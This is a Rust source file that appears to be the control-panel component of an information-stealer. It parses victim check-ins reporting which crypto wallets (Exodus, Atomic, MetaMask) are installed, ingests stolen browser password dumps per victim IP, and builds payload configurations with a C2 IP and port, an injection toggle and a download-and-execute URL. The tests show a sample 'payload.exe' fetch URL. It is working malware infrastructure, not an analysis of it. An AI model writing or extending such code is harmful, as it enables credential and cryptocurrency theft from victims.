use anyhow::{Result, Context};
use chrono::{DateTime, Utc};
use std::collections::HashMap;

/// Parse client data from the protocol format: Country|OS|GPU|CPU|Exists1|Exists2|Exists3
pub fn parse_client_data(client_ip: &str, data: &str) -> Result<mira_core::ClientInfo> {
    let parts: Vec<&str> = data.split('|').collect();
    
    if parts.len() < 7 {
        return Err(anyhow::anyhow!("Invalid client data format. Expected 7 parts, got {}", parts.len()));
    }
    
    let country = parts[0].to_string();
    let os = parts[1].to_string();
    let gpu = parts[2].to_string();
    let cpu = parts[3].to_string();
    let wallet_exodus = parts[4] == "1";
    let wallet_atomic = parts[5] == "1";
    let wallet_metamask = parts[6] == "1";
    
    let mut client = mira_core::ClientInfo::new(
        client_ip.to_string(),
        country,
        os,
        gpu,
        cpu,
    );
    
    client.wallet_exodus = wallet_exodus;
    client.wallet_atomic = wallet_atomic;
    client.wallet_metamask = wallet_metamask;
    
    Ok(client)
}

/// Parse password entries from a password file
/// Supports the format from the C# implementation with "==================================================" separators
pub fn parse_password_file(content: &str, client_ip: &str) -> Result<Vec<mira_core::PasswordEntry>> {
    let mut passwords = Vec::new();
    let lines: Vec<&str> = content.lines().collect();
    let mut current_entry: HashMap<String, String> = HashMap::new();
    
    for line in lines {
        let line = line.trim();
        
        if line == "==================================================" {
            // End of entry, process it
            if !current_entry.is_empty() {
                if let Ok(password_entry) = create_password_entry(&current_entry, client_ip) {
                    passwords.push(password_entry);
                }
                current_entry.clear();
            }
        } else if line.contains(':') {
            // Parse key-value pair
            if let Some(colon_pos) = line.find(':') {
                let key = line[..colon_pos].trim().to_string();
                let value = line[colon_pos + 1..].trim().to_string();
                current_entry.insert(key, value);
            }
        }
    }
    
    // Handle the last entry if there is one
    if !current_entry.is_empty() {
        if let Ok(password_entry) = create_password_entry(&current_entry, client_ip) {
            passwords.push(password_entry);
        }
    }
    
    Ok(passwords)
}

/// Create a password entry from parsed data
fn create_password_entry(data: &HashMap<String, String>, client_ip: &str) -> Result<mira_core::PasswordEntry> {
    let url = data.get("URL").unwrap_or(&String::new()).clone();
    let web_browser = data.get("Web Browser").unwrap_or(&String::new()).clone();
    let username = data.get("User Name").unwrap_or(&String::new()).clone();
    let password = data.get("Password").unwrap_or(&String::new()).clone();
    let strength = data.get("Password Strength").unwrap_or(&String::new()).clone();
    
    // Parse created time if available
    let created_time = data.get("Created Time")
        .and_then(|time_str| {
            // Try multiple date formats
            chrono::DateTime::parse_from_rfc3339(time_str).ok()
                .or_else(|| chrono::DateTime::parse_from_str(time_str, "%Y-%m-%d %H:%M:%S").ok())
                .or_else(|| chrono::DateTime::parse_from_str(time_str, "%m/%d/%Y %H:%M:%S").ok())
                .map(|dt| dt.with_timezone(&Utc))
        });
    
    Ok(mira_core::PasswordEntry {
        id: uuid::Uuid::new_v4(),
        client_ip: client_ip.to_string(),
        url,
        web_browser,
        username,
        password,
        strength,
        created_time,
        extracted_time: Utc::now(),
    })
}

/// Parse build configuration from the C# format
#[derive(Debug, Clone)]
pub struct BuildConfig {
    pub ip: String,
    pub port: u16,
    pub injection_enabled: bool,
    pub chrome_module_enabled: bool,
    pub download_execute_url: Option<String>,
    pub custom_icon_path: Option<String>,
}

impl BuildConfig {
    pub fn parse_from_form(
        ip: &str,
        port: &str,
        injection: bool,
        chrome: bool,
        download_execute: Option<&str>,
        icon_path: Option<&str>,
    ) -> Result<Self> {
        let port = port.parse::<u16>()
            .context("Invalid port number")?;
        
        if port == 0 || port > 65535 {
            return Err(anyhow::anyhow!("Port must be between 1 and 65535"));
        }
        
        let download_execute_url = download_execute
            .filter(|url| !url.is_empty() && *url != "0")
            .map(|url| url.to_string());
        
        let custom_icon_path = icon_path
            .filter(|path| !path.is_empty())
            .map(|path| path.to_string());
        
        Ok(Self {
            ip: ip.to_string(),
            port,
            injection_enabled: injection,
            chrome_module_enabled: chrome,
            download_execute_url,
            custom_icon_path,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_client_data() {
        let data = "USA|Windows 10|NVIDIA GTX 1080|Intel i7-8700K|1|0|1";
        let client = parse_client_data("192.168.1.100", data).unwrap();
        
        assert_eq!(client.ip, "192.168.1.100");
        assert_eq!(client.country, "USA");
        assert_eq!(client.os, "Windows 10");
        assert_eq!(client.gpu, "NVIDIA GTX 1080");
        assert_eq!(client.cpu, "Intel i7-8700K");
        assert!(client.wallet_exodus);
        assert!(!client.wallet_atomic);
        assert!(client.wallet_metamask);
    }

    #[test]
    fn test_parse_password_file() {
        let content = r#"
URL: https://example.com
Web Browser: Chrome
User Name: testuser
Password: testpass123
Password Strength: Strong
Created Time: 2024-01-01 12:00:00
==================================================
URL: https://another.com
Web Browser: Firefox
User Name: user2
Password: password456
Password Strength: Weak
Created Time: 2024-01-02 13:30:00
==================================================
"#;
        
        let passwords = parse_password_file(content, "192.168.1.100").unwrap();
        assert_eq!(passwords.len(), 2);
        
        assert_eq!(passwords[0].url, "https://example.com");
        assert_eq!(passwords[0].username, "testuser");
        assert_eq!(passwords[1].url, "https://another.com");
        assert_eq!(passwords[1].username, "user2");
    }

    #[test]
    fn test_build_config_parse() {
        let config = BuildConfig::parse_from_form(
            "127.0.0.1",
            "8080",
            true,
            false,
            Some("https://example.com/payload.exe"),
            Some("/path/to/icon.ico"),
        ).unwrap();
        
        assert_eq!(config.ip, "127.0.0.1");
        assert_eq!(config.port, 8080);
        assert!(config.injection_enabled);
        assert!(!config.chrome_module_enabled);
        assert_eq!(config.download_execute_url, Some("https://example.com/payload.exe".to_string()));
        assert_eq!(config.custom_icon_path, Some("/path/to/icon.ico".to_string()));
    }
}